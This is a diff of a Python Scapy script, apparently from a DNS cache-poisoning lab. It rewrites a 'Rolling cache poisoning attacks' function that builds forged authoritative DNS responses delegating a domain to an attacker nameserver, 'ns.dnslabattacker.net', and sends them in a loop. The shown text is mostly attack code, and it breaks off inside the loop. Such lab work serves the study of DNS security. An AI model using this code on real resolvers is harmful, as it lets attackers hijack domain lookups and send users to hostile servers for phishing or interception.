@@ -24,7 +24,7 @@ dns_port = args.dns_port
 # port that your bind uses to send its DNS queries
 query_port = args.query_port
 base_domain = 'example.com.'
-spoof = 'ns.bankofsteve.com'
+spoof = 'ns.dnslabattacker.net.'
 
 
 '''
@@ -58,18 +58,21 @@ def exampleSendDNSQuery():
     print response.show()
     print "***** End of Remote Server Packet *****\n"
 
+'''
+Rolling cache poisoning attacks.
+'''
 def attack():
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
     sock.bind((my_ip, my_port))
 
-    dns_request = DNS(rd=1, qdcount=1, qd=DNSQR(qname=base_domain))
-    # DNS(rd=1, qd=DNSQR(qname=base_domain))
-    fake_response = DNS(rd=1, id=42, qr=1, aa=1, qdcount=1, ancount=1, nscount=1, arcount=0, 
+    dns_request = DNS(qr=0, rd=1, ra=0, an=0, ns=0, ar=0, qd=DNSQR(qname=base_domain))
+    fake_response = DNS(id=42, qr=1, rd=1, ra=1, aa=1, 
 		qd=DNSQR(qname=base_domain), 
 		an=DNSRR(rrname=base_domain, ttl=70000, rdata='1.2.3.4', rdlen=4, type=1),
 		ns=(DNSRR(rrname=base_domain, type='NS', ttl=70000, rdata=spoof)),
         ar=NotImplemented
 	)
+    # qdcount=1, ancount=1, nscount=1, arcount=0
 
     while (1):
         # per new url:
